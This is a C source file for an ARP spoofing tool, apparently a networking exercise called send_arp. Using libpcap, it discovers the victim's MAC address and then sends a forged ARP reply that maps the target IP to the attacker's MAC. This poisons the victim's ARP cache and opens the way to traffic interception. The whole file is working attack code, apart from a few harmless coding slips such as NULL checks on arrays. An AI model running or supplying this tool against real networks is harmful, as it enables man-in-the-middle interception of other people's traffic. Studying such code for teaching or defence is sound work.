#include "send_arp.h"

int main(int argc, char *argv[]) {
	pcap_t *handle;
	struct pcap_pkthdr *header;
	u_int8_t errbuf[PCAP_ERRBUF_SIZE];
	u_int8_t *interface = argv[1];
	u_int8_t sender_mac[ETHER_ADDR_LEN];
	u_int8_t sender_ip[IP_ADDR_LEN];
	u_int8_t target_mac[ETHER_ADDR_LEN];
	u_int8_t target_ip[IP_ADDR_LEN];
	u_int8_t attacker_mac[ETHER_ADDR_LEN];
	u_int8_t attacker_ip[IP_ADDR_LEN];
	u_int8_t packet[60];
	const uint8_t *packet_recv;
	struct ether_header *eptr;
	struct arp_header *aptr;
	int i;

	if(argc != 4) {
		printf("Usage : ./send_arp <interface> <sender ip> <target ip>\n");
		return -1;
	}
	
	inet_pton(AF_INET, argv[2], sender_ip);
	inet_pton(AF_INET, argv[3], target_ip);

    handle = pcap_open_live(interface, BUFSIZ, 1, 1000, errbuf);
    if(handle == NULL) {
        printf("Couldn't open device %s: %s\n", interface, errbuf);
        return -1;
    }

	get_mac(attacker_mac, interface);
	if(attacker_mac == NULL) {
		printf("Couldn't get attacker's MAC address\n");
		return -1;
	}

	get_ip(attacker_ip, interface);
	if(attacker_ip == NULL) {
		printf("Couldn't get attacker's IP address\n");
		return -1;
	}

	printf("Attacker's MAC addr : "); for(i=0;i<6;i++) printf("%02x", attacker_mac[i]); printf("\n");
	printf("Attacker's IP addr : "); for(i=0;i<4;i++) printf("%02x", attacker_ip[i]); printf("\n");

	gen_arp_packet(packet, attacker_mac, NULL, attacker_ip, sender_ip, ARPOP_REQUEST);

	if(pcap_sendpacket(handle, packet, 60) != 0) {
		printf("Couldn't send packet\n");
		return -1;
	}
	
	while(1) {
		pcap_next_ex(handle, &header, &packet_recv);
		eptr = (struct ether_header *) packet_recv;
		aptr = (struct arp_header *) (packet_recv + 14);
		if(ntohs(eptr->ether_type) == ETHERTYPE_ARP && ntohs(aptr->ar_op) == ARPOP_REPLY)
			break;
	}
	memcpy(sender_mac, aptr->ar_sha, ETHER_ADDR_LEN);
	printf("Sender's MAC addr : "); for(i=0;i<6;i++) printf("%02x", sender_mac[i]); printf("\n");

	gen_arp_packet(packet, attacker_mac, sender_mac, target_ip, sender_ip, ARPOP_REPLY);

	if(pcap_sendpacket(handle, packet, 60) != 0) {
		printf("Couldn't send packet\n");
		return -1;
	}
}
